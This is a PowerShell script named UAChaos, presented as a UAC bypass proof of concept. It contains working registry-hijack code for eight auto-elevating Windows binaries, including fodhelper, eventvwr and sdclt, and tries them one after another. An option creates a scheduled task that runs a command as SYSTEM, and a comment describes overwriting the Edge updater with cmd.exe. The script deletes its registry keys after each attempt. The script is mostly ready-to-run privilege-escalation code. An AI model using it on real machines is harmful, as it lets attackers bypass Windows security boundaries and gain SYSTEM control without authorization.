<#
.SYNOPSIS
    UAC Bypass PoC Script with Multiple Methods Alpha Version with SYSTEM User-getter

.DESCRIPTION
    This script attempts various known UAC bypass Methods on Windows.
    It supports executing either a single Method or all sequentially until one succeeds.
    With the GetSystem flag you also can start a SYSTEM process.

    Extra Info:
    For foreground the cmd window in SYSTEM Mode you can use the MSDT ServiceUI.exe: 
    query user
    # Get Session ID i.e. 2
    # Run:
    .\UAChaos.ps1 -Method computerdefaults -Command "W:\ServiceUI.exe -session:2 C:\Windows\System32\cmd.exe" -GetSystem

.EXAMPLE
    .\UAChaos.ps1 -Method computerdefaults -Command "calc.exe" 
    .\UAChaos.ps1 -Method fodhelper -Command "cmd.exe /c "start cmd.exe" -GetSystem

.NOTES
    Autor: suuhm
    Github: https://github.com/suuhm

.PARAMETER Method
    Method name to attempt.
    Valid values: fodhelper, eventvwr, computerdefaults, sdclt, wsreset, mmc, eudcedit, netplwiz, all

.PARAMETER Command
    Command to run elevated (default: cmd.exe)

.PARAMETER GetSystem
    Optional Command if you wish to start process as SYSTEM
#>


param(
    [Parameter(Mandatory=$false)]
    [ValidateSet("fodhelper", "eventvwr", "computerdefaults", "sdclt", "wsreset", "mmc", "eudcedit", "netplwiz", "all")]
    [string]$Method,

    [Parameter(Mandatory=$false)]
    [string]$Command = "cmd.exe",

    [Parameter(Mandatory=$false)]
    [switch]$GetSystem
)

function Show-Banner {
    $banner = @"


   __    __   ______    ______   __                                                                              
  |  \  |  \ /      \  /      \ |  \                                                                              
  | `$`$  | `$`$|  `$`$`$`$`$`$\|  `$`$`$`$`$`$\| `$`$____    ______    ______    _______                         
  | `$`$  | `$`$| `$`$__| `$`$| `$`$   \`$`$| `$`$    \  |      \  /      \  /       \                            
  | `$`$  | `$`$| `$`$    `$`$| `$`$      | `$`$`$`$`$`$`$\  \`$`$`$`$`$`$\|  `$`$`$`$`$`$\|  `$`$`$`$`$`$`$      
  | `$`$  | `$`$| `$`$`$`$`$`$`$`$| `$`$   __ | `$`$  | `$`$ /      `$`$| `$`$  | `$`$ \`$`$    \                 
  | `$`$__/ `$`$| `$`$  | `$`$| `$`$__/  \| `$`$  | `$`$|  `$`$`$`$`$`$`$| `$`$__/ `$`$ _\`$`$`$`$`$`$\           
   \`$`$    `$`$| `$`$  | `$`$ \`$`$    `$`$| `$`$  | `$`$ \`$`$    `$`$ \`$`$    `$`$|       `$`$                
    \`$`$`$`$`$`$  \`$`$   \`$`$  \`$`$`$`$`$`$  \`$`$   \`$`$  \`$`$`$`$`$`$`$  \`$`$`$`$`$`$  \`$`$`$`$`$`$`$   
                                                                                                                  
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                            
                 UAC Bypass Testing — UAChaos v.0.1a (c) 2025 by suuhm                                            

"@
    Write-Host $banner -ForegroundColor Red -BackgroundColor Black
}

function Invoke-GetSystem {
    param([string]$Cmd)
    # Creating schedule Tasks to become SYSTEM, also SC Service creation or PSExec.exe etc. possible.
    $Cmd = "cmd.exe /c `"schtasks /create /tn WinSystemCmd /tr `"$Cmd`" /sc onlogon /ru SYSTEM /f && schtasks /run /tn WinSystemCmd`""
    #
    # Fallback:
    # Edge SCHEDTASK Hijacking:
    # $Cmd = "cmd.exe /c `"copy /Y `"C:\Windows\System32\cmd.exe`" `"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe`"`""
    return $Cmd
}

function Cleanup-Registry {
    param([string]$path)
    try {
        if (Test-Path -Path $path) {
            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Warning "Cleanup failed for $path : $_"
    }
}

function Invoke-Fodhelper {
    Write-Host "`n [+] Trying fodhelper.exe Method..."
    $reg1 = "HKCU:\Software\Classes\qUACkery\Shell\Open\Command"
    $reg2 = "HKCU:\Software\Classes\MS-Settings"

    New-Item -Path $reg1 -Force | Out-Null
    Set-ItemProperty -Path $reg1 -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg1 -Name "DelegateExecute" -Value "" -Force | Out-Null

    New-Item -Path $reg2 -Force | Out-Null
    Set-ItemProperty -Path $reg2 -Name "CurVer" -Value "qUACkery" -Force
    Start-Process "fodhelper.exe"
    Start-Sleep -Seconds 5

    Cleanup-Registry $reg1
    Cleanup-Registry $reg2
}

function Invoke-Eventvwr {
    Write-Host "`n [+] Trying eventvwr.exe Method..."
    $reg = "HKCU:\Software\Classes\mscfile\shell\open\Command"

    New-Item -Path $reg -Force | Out-Null
    Set-ItemProperty -Path $reg -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "eventvwr.exe"
    Start-Sleep -Seconds 5
    Cleanup-Registry "HKCU:\Software\Classes\mscfile"
}

function Invoke-ComputerDefaults {
    Write-Host "`n [+] Trying ComputerDefaults.exe Method..."
    $reg = "HKCU:\Software\Classes\ms-settings\shell\open\Command"
    New-Item -Path $reg -Force | Out-Null
    Set-ItemProperty -Path $reg -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "C:\Windows\System32\ComputerDefaults.exe"
    Start-Sleep -Seconds 5
    Cleanup-Registry "HKCU:\Software\Classes\ms-settings"
}

function Invoke-Sdclt {
    Write-Host "`n [+] Trying sdclt.exe Method..."
    $reg1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
    $reg2 = "HKCU:\Software\Classes\exefile\shell\open\Command"
    New-Item -Path $reg1 -Force | Out-Null
    Set-ItemProperty -Path $reg1 -Name "(default)" -Value $Command -Force
    New-Item -Path $reg2 -Force | Out-Null
    Set-ItemProperty -Path $reg2 -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg2 -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 5
    #Remove-Item -Path $regPath -Recurse -Force
    Cleanup-Registry $reg1
    Cleanup-Registry $reg2
}

function Invoke-Wsreset {
    Write-Host "`n [+] Trying WSReset.exe Method..."
    $reg = "HKCU:\Software\Classes\WSReset\shell\open\Command"
    New-Item -Path $reg -Force | Out-Null
    Set-ItemProperty -Path $reg -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "wsreset.exe"
    Start-Sleep -Seconds 5
    Cleanup-Registry $reg
}

function Invoke-Mmc {
    Write-Host "`n [+] Trying mmc.exe Method..."
    $reg = "HKCU:\Software\Classes\mscfile\shell\open\Command"
    New-Item -Path $reg -Force | Out-Null
    Set-ItemProperty -Path $reg -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "mmc.exe"
    Start-Sleep -Seconds 5
    Cleanup-Registry $reg
}

function Invoke-Eudcedit {
    Write-Host "`n [+] Trying eudcedit.exe Method..."
    $reg = "HKCU:\Software\Classes\eudcedit\shell\open\command"
    New-Item -Path $reg -Force | Out-Null
    Set-ItemProperty -Path $reg -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "eudcedit.exe"
    Start-Sleep -Seconds 5
    Cleanup-Registry $reg
}

function Invoke-Netplwiz {
    Write-Host "`n [+] Trying netplwiz.exe Method..."
    $reg = "HKCU:\Software\Classes\netplwiz\shell\open\command"
    New-Item -Path $reg -Force | Out-Null
    Set-ItemProperty -Path $reg -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path $reg -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "netplwiz.exe"
    Start-Sleep -Seconds 5
    Cleanup-Registry $reg
}


function Invoke-AllMethods {
    $Methods = @(
        { Invoke-Fodhelper },
        { Invoke-Eventvwr },
        { Invoke-ComputerDefaults },
        { Invoke-Sdclt },
        { Invoke-Wsreset },
        { Invoke-Mmc },
        { Invoke-Eudcedit },
        { Invoke-Netplwiz }
    )

    foreach ($MethodFunc in $Methods) {
        try {
            $MethodFunc.Invoke()
            Start-Sleep -Seconds 10
        } catch {
            Write-Warning "`n [!] Method failed: $_"
        }
    }
}

#
# << MAIN 
#
Show-Banner

if ($GetSystem) {
    $Command = Invoke-GetSystem -Cmd $Command
    Write-Host "`n [!] Running command ($Command) as NT\SYSTEM." -ForegroundColor DarkCyan
}

if (-not $Method) {
    Write-Host "`n [!] Please specify a Method. Valid values are: fodhelper, eventvwr, computerdefaults, sdclt, wsreset, mmc, eudcedit, netplwiz, all." -ForegroundColor Yellow
    exit
}

switch ($Method.ToLower()) {
    "fodhelper" { Invoke-Fodhelper }
    "eventvwr" { Invoke-Eventvwr }
    "computerdefaults" { Invoke-ComputerDefaults }
    "sdclt" { Invoke-Sdclt }
    "wsreset" { Invoke-Wsreset }
    "mmc" { Invoke-Mmc }
    "eudcedit" { Invoke-Eudcedit }
    "netplwiz" { Invoke-Netplwiz }
    "all" { Invoke-AllMethods }

    default {
        Write-Host "`n [!] Unknown Method '$Method'. Valid values are: fodhelper, eventvwr, computerdefaults, sdclt, wsreset, mmc, eudcedit, netplwiz, all." -ForegroundColor Red
        exit
    }
}
